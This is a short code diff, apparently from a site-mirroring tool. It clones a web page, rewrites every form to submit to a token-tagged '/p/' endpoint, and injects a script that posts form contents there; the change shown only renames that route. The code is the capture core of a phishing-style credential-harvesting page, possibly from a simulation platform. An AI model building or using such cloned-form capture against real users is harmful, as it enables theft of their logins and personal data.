@@ -172,7 +172,7 @@ function buildFormHookScript(): string {
       }
     }
     var token = new URLSearchParams(window.location.search).get('token') || '';
-    fetch('/api/p/' + token, {
+    fetch('/p/' + token, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
@@ -380,12 +380,12 @@ export async function mirrorSite(url: string, pageId: string): Promise<MirrorRes
   // Replace form action with a placeholder that the serving layer fills in
   html = html.replace(
     /<form([^>]*)\s+action\s*=\s*["'][^"']*["']/gi,
-    '<form$1 action="/api/p/__TOKEN__"'
+    '<form$1 action="/p/__TOKEN__"'
   );
   // Forms without action attribute — add one
   html = html.replace(
     /<form(?![^>]*action\s*=)([^>]*)>/gi,
-    '<form$1 action="/api/p/__TOKEN__">'
+    '<form$1 action="/p/__TOKEN__">'
   );
 
   // Step 8: Inject form hook script
